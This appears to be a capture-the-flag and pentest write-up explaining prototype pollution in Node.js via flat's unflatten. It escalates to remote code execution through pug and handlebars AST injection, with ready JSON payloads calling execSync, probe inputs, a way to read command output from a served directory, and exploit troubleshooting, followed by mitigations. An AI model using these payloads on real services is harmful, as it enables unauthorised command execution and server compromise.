---
title: Prototype pollution and AST injection — from an unsafe merge to RCE
tags: [web, nodejs, prototype-pollution, ast-injection, pug, handlebars, flat]
---

# Prototype pollution → AST injection → RCE

**English** | [🇪🇸 Español](prototype-pollution-ast.md)

## 1. The underlying bug

A recursive `merge`/`unflatten` that copies keys from attacker JSON without filtering `__proto__`, `constructor` or `prototype` writes into `Object.prototype`. From then on, **every object in the process** inherits those properties.

```js
// flat@5.0.0: unflatten copies keys verbatim
const { unflatten } = require('flat');
const obj = unflatten(JSON.parse('{"__proto__":{"isAdmin":true}}'));
console.log({}.isAdmin); // true
```

The vulnerable range is `flat` 5.0.0–5.0.2 (Snyk `SNYK-JS-FLAT-596927`); the fix landed in 5.0.1+ for `unflatten` and 5.0.1/6.0.1 for `flatten`.

## 2. Detection

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
{"a.__proto__.polluted": "yes"}
```

Three variants because each library filters different things. The check is always the same: send it, get a response that reads the property, and see whether it appears. If the JSON goes through `unflatten({...})`, the dotted key (`a.__proto__.x`) is the one that arrives.

## 3. Why pollution becomes execution

Template engines build an AST and then **generate JavaScript** that gets evaluated. The generator reads node properties with plain member access:

```js
// pug: compiler.js
visit(node) {
  const handler = this[node.type]   // dispatch by type
  return handler(node)
}
visitCode(node) {
  if (node.block) this.visit(node.block)   // child block
  this.buffer(`...${node.line}...`)        // line used for debugging
}
```

If `node` has no `block`, the lookup climbs the prototype chain and finds the polluted `block`. The compiler treats it as a real node and its `line` is written **into the generated code**. With `new Function(...)` behind it, that string runs.

Handlebars suffers the same with other properties: `Object.prototype.type = 'Program'` plus `body`/`pendingContent` inject nodes into `accept()` and the compiler.

## 4. Real payloads

Pug (HTB Gunship, `pug@3.0.x` + `flat@5.0.0`):

```json
{
  "artist.name": "Haigh",
  "__proto__.block": {
    "type": "Text",
    "line": "process.mainModule.require('child_process').execSync('id > /app/static/id.txt')"
  }
}
```

`artist.name` has to satisfy the app check (`includes('Haigh')`) so the template gets compiled. `type: Text` is mandatory: the compiler dispatches by type and `line` is what gets copied into code.

Handlebars (`handlebars@4.x`):

```json
{
  "__proto__.type": "Program",
  "__proto__.body": [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
      "type": "NumberLiteral",
      "value": "process.mainModule.require('child_process').execSync('id')"
    }],
    "loc": { "start": 0, "end": 0 }
  }]
}
```

## 5. Exfiltration

`execSync` returns nothing to the attacker by itself. Two ways out:

- **Write into a served directory**: `/app/static/id.txt` and fetch it over HTTP.
- **Read the render output**: with `type: Text` and `val` instead of `line`, the value is printed into the template, handy to confirm pollution before attempting RCE.

## 6. Typical errors

- **Pollution does not persist** → the process restarts between requests (serverless, `nodemon`, `--watch`); send pollution and trigger within the same process lifetime.
- **`__proto__` is ignored** → the parser uses `Object.create(null)` or the library is patched; try `constructor.prototype`.
- **Payload arrives but nothing runs** → the node type does not exist in that compiler (`Text`, `Code`, `Block`) or `line` is missing; check the engine version.
- **`node.line` throws a syntax error** → generated code concatenates your string at a fixed position; adjust quotes or use a single expression.

## 7. Detection and mitigation

- Reject `__proto__`, `constructor` and `prototype` in any input merge; use `Object.create(null)` or `Map`.
- Update `flat`, `lodash`, `qs`, `minimist` and the template engines; `npm audit` flags them.
- Node.js: `--disable-proto=throw` blocks `__proto__` at runtime as defence in depth.
- Never compile templates with options derived from input; freeze `Object.prototype` in exposed services.
- Detection: JSON bodies with `__proto__`, `constructor.prototype` or dotted keys hitting APIs that do not expect them.

MITRE: T1190, T1059.007 (JavaScript), T1027.
